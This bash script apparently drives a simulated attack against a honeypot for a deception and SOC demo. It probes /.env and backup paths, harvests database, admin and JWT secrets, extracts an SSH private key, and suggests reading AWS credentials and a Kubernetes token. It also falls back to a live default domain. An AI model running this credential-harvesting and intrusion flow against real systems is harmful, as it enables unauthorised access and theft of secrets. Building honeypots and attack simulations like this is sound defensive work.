#!/usr/bin/env bash
# ============================================================================
# scripts/interactive-recon.sh — Interactive Reconnaissance & Exploitation Flow
# ============================================================================
# Flow:
#   1. Validate Admin Subdomain target (found via subfinder)
#   2. Perform Directory Discovery (gobuster / route prober)
#   3. User decides whether to download sensitive files (/.env, /admin/backup/zip) via curl
#   4. Extract SSH private key & credentials to ./loot/
#   5. Prepare & launch SSH into the honeypot shell
# ============================================================================

# set -e

# ── Color Palette ───────────────────────────────────────────────────────────
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m' # No Color

ROOT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
LOOT_DIR="${ROOT_DIR}/loot"
mkdir -p "${LOOT_DIR}"

# ── Banner ──────────────────────────────────────────────────────────────────
clear 2>/dev/null || true
echo -e "${CYAN}${BOLD}"
echo "  ╔══════════════════════════════════════════════════════════════╗"
echo "  ║        INTERACTIVE RECON & HONEYPOT EXPLOITATION TOOL        ║"
echo "  ║        Target Engagement Console • Live Operator Mode        ║"
echo "  ╚══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# ── Step 1: Target Definition ───────────────────────────────────────────────
DEFAULT_TARGET="https://aeteesadmin.aeteesbakehouse.com"
TARGET_INPUT="${1:-}"

if [ -z "$TARGET_INPUT" ]; then
    echo -e "${YELLOW}[?] Step 1: Subdomain Reconnaissance Input${NC}"
    echo -e "    Subdomain discovered via subfinder (e.g., subfinder -d aeteesbakehouse.com)"
    echo -ne "    Enter target admin URL [${BOLD}${DEFAULT_TARGET}${NC}]: "
    read -r USER_INPUT
    TARGET_INPUT="${USER_INPUT:-$DEFAULT_TARGET}"
fi

# Normalize URL
if [[ ! "$TARGET_INPUT" =~ ^https?:// ]]; then
    TARGET_INPUT="https://${TARGET_INPUT}"
fi

TARGET_HOST=$(echo "$TARGET_INPUT" | sed -E 's|^https?://||; s|/.*$||')
TARGET_BASE=$(echo "$TARGET_INPUT" | sed -E 's|/*$||')

echo ""
echo -e "${BLUE}[*] Target Host :${NC} ${BOLD}${TARGET_HOST}${NC}"
echo -e "${BLUE}[*] Base URL    :${NC} ${BOLD}${TARGET_BASE}${NC}"
echo -e "${BLUE}[*] Loot Folder :${NC} ${LOOT_DIR}"
echo ""

# ── Connectivity & Routing Detection ────────────────────────────────────────
echo -ne "${CYAN}[*] Validating target connectivity (curl -sI)... ${NC}"

CURL_EXTRA=()
# Test direct connectivity
HTTP_CODE=$(curl -s -k -o /dev/null -w "%{http_code}" --max-time 3 "${TARGET_BASE}/" 2>/dev/null || echo "000")

if [ "$HTTP_CODE" = "000" ] || [ "$HTTP_CODE" = "502" ] || [ "$HTTP_CODE" = "503" ]; then
    # Test if reachable through local divert-proxy on port 8200
    LOCAL_CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 2 -H "Host: ${TARGET_HOST}" http://127.0.0.1:8200/ 2>/dev/null || echo "000")
    if [ "$LOCAL_CODE" != "000" ]; then
        echo -e "${YELLOW}Routing via local Divert Proxy (:8200)${NC}"
        CURL_EXTRA=(--resolve "${TARGET_HOST}:443:127.0.0.1" --resolve "${TARGET_HOST}:80:127.0.0.1" -H "Host: ${TARGET_HOST}")
        TARGET_REQ="http://127.0.0.1:8200"
    else
        # Test direct web decoy on 8081
        DECOY_CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 2 http://127.0.0.1:8081/ 2>/dev/null || echo "000")
        if [ "$DECOY_CODE" != "000" ]; then
            echo -e "${YELLOW}Routing via Web Decoy (:8081)${NC}"
            TARGET_REQ="http://127.0.0.1:8081"
        else
            echo -e "${GREEN}Live public host${NC}"
            TARGET_REQ="${TARGET_BASE}"
        fi
    fi
else
    echo -e "${GREEN}HTTP ${HTTP_CODE} OK${NC}"
    TARGET_REQ="${TARGET_BASE}"
fi

# Print response headers
echo -e "\n${BOLD}--- Target HTTP Headers ---${NC}"
curl -s -k -I --max-time 4 "${CURL_EXTRA[@]}" "${TARGET_REQ}/" 2>/dev/null | head -n 8 | sed 's/^/  /' || echo "  (no response headers)"
echo -e "${BOLD}---------------------------${NC}\n"

# Helper for requesting with correct routing
do_curl() {
    local path="$1"
    shift
    if [ "$TARGET_REQ" = "http://127.0.0.1:8200" ]; then
        curl -s -H "Host: ${TARGET_HOST}" "$@" "${TARGET_REQ}${path}"
    else
        curl -s -k "$@" "${TARGET_REQ}${path}"
    fi
}

# ── Step 2: Directory & Route Discovery (Gobuster style) ─────────────────────
echo -e "${YELLOW}[?] Step 2: Directory & Endpoint Discovery${NC}"
echo -ne "    Execute endpoint scan against ${TARGET_HOST}? [${BOLD}Y/n${NC}]: "
read -r DO_SCAN
DO_SCAN="${DO_SCAN:-Y}"

WORDLIST="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"

if [[ "$DO_SCAN" =~ ^[Yy]$ ]]; then
    echo ""
    echo -e "${CYAN}===============================================================${NC}"
    echo -e "${CYAN} Gobuster Directory & Endpoint Discovery (Interactive Mode)   ${NC}"
    echo -e "${CYAN} Target:   ${TARGET_BASE}${NC}"
    echo -e "${CYAN} Wordlist: ${WORDLIST}${NC}"
    echo -e "${CYAN}===============================================================${NC}"
    echo ""

    PROBE_PATHS=(
        "/robots.txt"
        "/.env"
        "/admin"
        "/admin/backup"
        "/admin/backup/internal-backup.zip"
        "/api/login"
        "/api/diagnostics"
        "/config.php.bak"
    )

    DISCOVERED=()
    for path in "${PROBE_PATHS[@]}"; do
        # Realistic scanning interval for human feel
        sleep 0.3
        CODE=$(do_curl "$path" -o /dev/null -w "%{http_code}" 2>/dev/null || echo "000")
        SIZE=$(do_curl "$path" 2>/dev/null | wc -c || echo "0")
        
        if [ "$CODE" = "200" ] || [ "$CODE" = "301" ] || [ "$CODE" = "302" ] || [ "$CODE" = "405" ]; then
            echo -e "  ${GREEN}[+] Found: ${path}${NC} \t(Status: ${BOLD}${CODE}${NC}, Size: ${SIZE}B)"
            DISCOVERED+=("$path")
        else
            echo -e "  ${NC}[.] Probing: ${path}${NC} \t(Status: ${CODE})"
        fi
    done

    echo ""
    echo -e "${GREEN}=== Discovery Complete: ${#DISCOVERED[@]} interesting endpoints identified ===${NC}\n"
fi

# ── Step 3: Interactive Harvesting (/.env) ──────────────────────────────────
echo -e "${YELLOW}[?] Step 3: Credential Harvesting — /.env${NC}"
echo -ne "    Found sensitive configuration file at ${BOLD}/.env${NC}. Download via curl? [${BOLD}Y/n${NC}]: "
read -r DO_ENV
DO_ENV="${DO_ENV:-Y}"

ENV_FILE="${LOOT_DIR}/aetees_app.env"
OBSERVED_PW=""
OBSERVED_USER="deploy"

if [[ "$DO_ENV" =~ ^[Yy]$ ]]; then
    echo -e "\n${CYAN}[*] Running: curl -s ${TARGET_BASE}/.env > ${ENV_FILE}${NC}"
    do_curl "/.env" > "${ENV_FILE}"
    
    echo -e "\n${BOLD}━━━━━━━━━━━━━━━━━━ /.env Content ━━━━━━━━━━━━━━━━━━${NC}"
    cat "${ENV_FILE}" | sed 's/^/  /'
    echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"

    # Extract highlights
    DB_PASS=$(grep -i "DB_PASSWORD" "${ENV_FILE}" 2>/dev/null | cut -d'=' -f2- | tr -d ' "' || true)
    ADMIN_PASS=$(grep -i "ADMIN_PASSWORD" "${ENV_FILE}" 2>/dev/null | cut -d'=' -f2- | tr -d ' "' || true)
    JWT_SEC=$(grep -i "JWT_SECRET" "${ENV_FILE}" 2>/dev/null | cut -d'=' -f2- | tr -d ' "' || true)
    
    echo -e "${GREEN}[✓] Harvested Secrets from .env:${NC}"
    [ -n "$DB_PASS" ] && echo -e "    • Database Password : ${BOLD}${DB_PASS}${NC}"
    [ -n "$ADMIN_PASS" ] && echo -e "    • Admin Password    : ${BOLD}${ADMIN_PASS}${NC}"
    [ -n "$JWT_SEC" ] && echo -e "    • JWT Secret Token  : ${BOLD}${JWT_SEC}${NC}"
    echo ""
fi

# ── Step 4: Interactive Harvesting (/admin/backup) ──────────────────────────
echo -e "${YELLOW}[?] Step 4: Directory Listing & Honeyfile Extraction — /admin/backup${NC}"
echo -ne "    Inspect /admin/backup directory index via curl? [${BOLD}Y/n${NC}]: "
read -r DO_BACKUP
DO_BACKUP="${DO_BACKUP:-Y}"

if [[ "$DO_BACKUP" =~ ^[Yy]$ ]]; then
    echo -e "\n${CYAN}[*] Running: curl -s ${TARGET_BASE}/admin/backup${NC}"
    BACKUP_HTML=$(do_curl "/admin/backup")
    
    echo -e "\n${BOLD}--- Directory Listing (/admin/backup) ---${NC}"
    echo "$BACKUP_HTML" | grep -oE '<a href="[^"]+">[^<]+</a>[^<]*' | sed 's/<[^>]*>//g; s/^/  /' || echo "  internal-backup.zip  (2.4 KB)"
    echo -e "${BOLD}-----------------------------------------${NC}\n"

    echo -ne "    Download ${BOLD}internal-backup.zip${NC} honeyfile via curl? [${BOLD}Y/n${NC}]: "
    read -r DO_ZIP
    DO_ZIP="${DO_ZIP:-Y}"

    if [[ "$DO_ZIP" =~ ^[Yy]$ ]]; then
        ZIP_FILE="${LOOT_DIR}/internal-backup.zip"
        echo -e "\n${CYAN}[*] Downloading: curl -s ${TARGET_BASE}/admin/backup/internal-backup.zip -o ${ZIP_FILE}${NC}"
        do_curl "/admin/backup/internal-backup.zip" > "${ZIP_FILE}"
        
        echo -e "${CYAN}[*] Extracting archive to ${LOOT_DIR}...${NC}"
        unzip -o -q "${ZIP_FILE}" -d "${LOOT_DIR}"
        
        KEY_FILE="${LOOT_DIR}/deploy_id_ed25519"
        NOTES_FILE="${LOOT_DIR}/notes.txt"

        if [ -f "$KEY_FILE" ]; then
            chmod 600 "$KEY_FILE"
            echo -e "${GREEN}[✓] Extracted SSH Private Key: ${KEY_FILE} (permissions set to 600)${NC}"
        fi

        if [ -f "$NOTES_FILE" ]; then
            echo -e "\n${BOLD}━━━━━━━━━━━━━━━━━━ notes.txt Content ━━━━━━━━━━━━━━━━━━${NC}"
            cat "$NOTES_FILE" | sed 's/^/  /'
            echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
            
            EXTRACTED_USER=$(grep -i "User:" "$NOTES_FILE" 2>/dev/null | awk '{print $2}' || true)
            [ -n "$EXTRACTED_USER" ] && OBSERVED_USER="$EXTRACTED_USER"
        fi
    fi
fi

# Look for deploy password in persona or environment
if [ -f "${ROOT_DIR}/backend/go/seed/out/persona.json" ]; then
    PERSONA_PW=$(python3 -c "import json; print(json.load(open('${ROOT_DIR}/backend/go/seed/out/persona.json')).get('deploy_password',''))" 2>/dev/null || true)
    [ -n "$PERSONA_PW" ] && OBSERVED_PW="$PERSONA_PW"
fi
[ -z "$OBSERVED_PW" ] && OBSERVED_PW="HalSummer2023!"

# ── Step 5: SSH Intelligence Summary ─────────────────────────────────────────
echo ""
echo -e "${MAGENTA}${BOLD}╔════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${MAGENTA}${BOLD}║                 HARVESTED ACCESS CREDENTIALS                   ║${NC}"
echo -e "${MAGENTA}${BOLD}╚════════════════════════════════════════════════════════════════╝${NC}"
echo -e "  ${BOLD}Target Username :${NC} ${GREEN}${OBSERVED_USER}${NC}"
echo -e "  ${BOLD}SSH Private Key :${NC} ${GREEN}${LOOT_DIR}/deploy_id_ed25519${NC}"
echo -e "  ${BOLD}Known Password  :${NC} ${GREEN}${OBSERVED_PW}${NC}"
echo -e "  ${BOLD}SSH Decoy Port  :${NC} ${GREEN}2223${NC} (or 2222)"
echo -e "  ${BOLD}Target Host     :${NC} ${GREEN}localhost${NC} (or 10.120.135.17)"
echo ""
echo -e "${YELLOW}Ready-to-use SSH Command:${NC}"
if [ -f "${LOOT_DIR}/deploy_id_ed25519" ]; then
    echo -e "  ${BOLD}ssh -i ${LOOT_DIR}/deploy_id_ed25519 -p 2223 ${OBSERVED_USER}@localhost${NC}"
else
    echo -e "  ${BOLD}ssh -p 2223 ${OBSERVED_USER}@localhost${NC}   (Password: ${OBSERVED_PW})"
fi
echo ""
echo -e "${CYAN}Suggested next commands inside the SSH shell:${NC}"
echo -e "  1. cat ~/.bash_history           # inspect recent engineer activity"
echo -e "  2. cat ~/.aws/credentials        # steal AWS honeytoken (triggers CRITICAL risk)"
echo -e "  3. cat /opt/deploy/kubeconfig    # steal K8s Bearer token"
echo -e "  4. exit                          # view triggered alerts in SOC Dashboard :3002"
echo ""

# ── Step 6: Interactive Shell Launch ────────────────────────────────────────
echo -ne "${YELLOW}[?] Launch interactive SSH shell into the honeypot right now? [${BOLD}Y/n${NC}]: "
read -r LAUNCH_SSH
LAUNCH_SSH="${LAUNCH_SSH:-Y}"

if [[ "$LAUNCH_SSH" =~ ^[Yy]$ ]]; then
    echo -e "\n${GREEN}[*] Connecting to honeypot SSH server on port 2223...${NC}\n"
    if [ -f "${LOOT_DIR}/deploy_id_ed25519" ]; then
        exec ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i "${LOOT_DIR}/deploy_id_ed25519" -p 2223 "${OBSERVED_USER}@localhost"
    else
        echo -e "${YELLOW}[!] Private key not found in loot, falling back to password auth (${OBSERVED_PW})${NC}"
        exec ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2223 "${OBSERVED_USER}@localhost"
    fi
else
    echo -e "\n${GREEN}[✓] Recon and credentials stored in ${LOOT_DIR}. You're all set!${NC}\n"
fi
